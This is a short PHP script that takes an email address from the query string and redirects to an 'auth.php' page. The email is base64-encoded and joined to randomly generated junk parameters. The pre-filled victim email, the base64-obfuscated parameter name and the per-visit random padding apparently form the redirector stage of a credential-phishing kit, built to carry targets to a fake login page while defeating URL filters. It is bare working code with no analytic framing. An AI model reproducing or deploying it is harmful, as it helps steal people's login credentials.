<?php
session_start();

if($_GET['email'])
{
    
    $e = base64_encode($_GET['email']);
}
else
{
    $datatransfer = base64_encode('datatransfer');
    $useremail = base64_decode($_GET[$datatransfer]);
    $e = base64_encode($useremail);
}

$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 
function generate_string($input, $strength = 16) {
    $input_length = strlen($input);
    $random_string = '';
    for($i = 0; $i < $strength; $i++) {
        $random_character = $input[mt_rand(0, $input_length - 1)];
        $random_string .= $random_character;
    }
 
    return $random_string;
}
 
$url_coding = base64_encode(generate_string($permitted_chars, 20).'='.$e.$date.'&'.generate_string($permitted_chars, 20).'='.generate_string($permitted_chars, 20).'&'.generate_string($permitted_chars, 20).'='.generate_string($permitted_chars, 20));


header("Location: auth.php?e=$e&$url_coding");

?>